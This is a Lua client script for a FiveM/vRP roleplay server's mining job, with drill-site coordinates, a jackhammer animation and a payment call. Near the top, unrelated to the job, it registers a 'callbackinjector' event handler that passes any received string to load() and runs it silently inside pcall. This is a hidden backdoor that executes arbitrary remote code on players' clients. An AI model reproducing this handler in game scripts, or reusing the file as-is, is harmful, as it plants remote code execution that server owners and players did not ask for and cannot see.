local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
vRP = Proxy.getInterface("vRP")
emP = Tunnel.getInterface("emp_minerador")
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local servico = false
local selecionado = 1
-----------------------------------------------------------------------------------------------------------------------------------------
-- RESIDENCIAS
-----------------------------------------------------------------------------------------------------------------------------------------
local locs = {
	[1] = { ['x'] = 2956.11, ['y'] = 2772.93, ['z'] = 40.22 },
	[2] = { ['x'] = 2957.54, ['y'] = 2772.76, ['z'] = 40.32 },
	[3] = { ['x'] = 2953.58, ['y'] = 2770.19, ['z'] = 39.59 },
	[4] = { ['x'] = 2952.57, ['y'] = 2768.19, ['z'] = 40.03 },
	[5] = { ['x'] = 2948.31, ['y'] = 2767.55, ['z'] = 39.91 },
	[6] = { ['x'] = 2947.96, ['y'] = 2765.65, ['z'] = 40.55 },
	[7] = { ['x'] = 2942.52, ['y'] = 2760.60, ['z'] = 42.82 },
	[8] = { ['x'] = 2943.45, ['y'] = 2756.52, ['z'] = 43.66 },
	[9] = { ['x'] = 2947.35, ['y'] = 2754.58, ['z'] = 43.97 },
	[10] = { ['x'] = 2954.03, ['y'] = 2754.14, ['z'] = 43.96 },
	[11] = { ['x'] = 2955.20, ['y'] = 2756.07, ['z'] = 44.32 },
	[12] = { ['x'] = 2959.33, ['y'] = 2758.81, ['z'] = 42.57 },
	[13] = { ['x'] = 2959.82, ['y'] = 2765.70, ['z'] = 41.92 },
	[14] = { ['x'] = 2958.33, ['y'] = 2767.20, ['z'] = 41.42 },
	[15] = { ['x'] = 2974.34, ['y'] = 2745.34, ['z'] = 43.91 },
	[16] = { ['x'] = 2983.58, ['y'] = 2763.12, ['z'] = 43.66 },
	[17] = { ['x'] = 2988.45, ['y'] = 2753.75, ['z'] = 43.52 },
	[18] = { ['x'] = 2991.07, ['y'] = 2776.31, ['z'] = 43.78 },
	[19] = { ['x'] = 2959.03, ['y'] = 2819.98, ['z'] = 43.69 },
	[20] = { ['x'] = 2956.01, ['y'] = 2820.06, ['z'] = 43.19 },
	[21] = { ['x'] = 2951.13, ['y'] = 2816.52, ['z'] = 42.92 },
	[22] = { ['x'] = 2948.04, ['y'] = 2820.89, ['z'] = 43.61 },
	[23] = { ['x'] = 2944.52, ['y'] = 2820.23, ['z'] = 43.53 },
	[24] = { ['x'] = 2944.25, ['y'] = 2818.68, ['z'] = 43.53 },
	[25] = { ['x'] = 2938.35, ['y'] = 2813.00, ['z'] = 43.44 },
	[26] = { ['x'] = 2936.61, ['y'] = 2814.16, ['z'] = 44.02 },
	[27] = { ['x'] = 2925.64, ['y'] = 2796.38, ['z'] = 41.47 },
	[28] = { ['x'] = 2925.34, ['y'] = 2794.84, ['z'] = 41.51 },
	[29] = { ['x'] = 2925.83, ['y'] = 2792.54, ['z'] = 41.23 },
	[30] = { ['x'] = 2927.94, ['y'] = 2789.11, ['z'] = 40.65 },
	[31] = { ['x'] = 2928.14, ['y'] = 2790.74, ['z'] = 40.80 },
	[32] = { ['x'] = 2930.75, ['y'] = 2786.90, ['z'] = 40.14 },
	[33] = { ['x'] = 2934.45, ['y'] = 2784.03, ['z'] = 40.09 },
	[34] = { ['x'] = 2936.94, ['y'] = 2774.47, ['z'] = 39.66 },
	[35] = { ['x'] = 2938.30, ['y'] = 2774.27, ['z'] = 39.74 },
	[36] = { ['x'] = 2937.25, ['y'] = 2771.71, ['z'] = 39.90 },
	[37] = { ['x'] = 2939.04, ['y'] = 2769.32, ['z'] = 39.63 }
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- TRABALHAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local timing = 1000
		if not servico then
			local ped = PlayerPedId()
			local vehicle = GetPlayersLastVehicle()
			local distance = GetDistanceBetweenCoords(locs[selecionado].x,locs[selecionado].y,locs[selecionado].z,GetEntityCoords(ped),true)

			if distance <= 20.0 then
				timing = 5
				DrawMarker(21,locs[selecionado].x,locs[selecionado].y,locs[selecionado].z-0.3,0,0,0,0,180.0,130.0,0.6,0.8,0.5,255,0,0,50,1,0,0,1)
				if distance <= 1.2 and IsControlJustPressed(0,38) and not IsPedInAnyVehicle(ped) and emP.checkWeight() and GetEntityModel(vehicle) == 48339065 then
					servico = true
					TriggerEvent("cancelando",true)
					SetEntityCoords(ped,locs[selecionado].x,locs[selecionado].y,locs[selecionado].z-1)
					vRP._CarregarObjeto("amb@world_human_const_drill@male@drill@base","base","prop_tool_jackham",15,28422)
					SetTimeout(13000,function()
						servico = false
						vRP._DeletarObjeto()
						vRP._stopAnim(false)
						--TriggerServerEvent("trydeleteobj",ObjToNet("prop_tool_jackham"))
						TriggerEvent("cancelando",false)
						backentrega = selecionado
						while true do
							if backentrega == selecionado then
								selecionado = math.random(#locs)
							else
								break
							end
							Citizen.Wait(10)
						end
						emP.checkPayment()
					end)
				end
			end
		end
		Citizen.Wait(timing)
	end
end)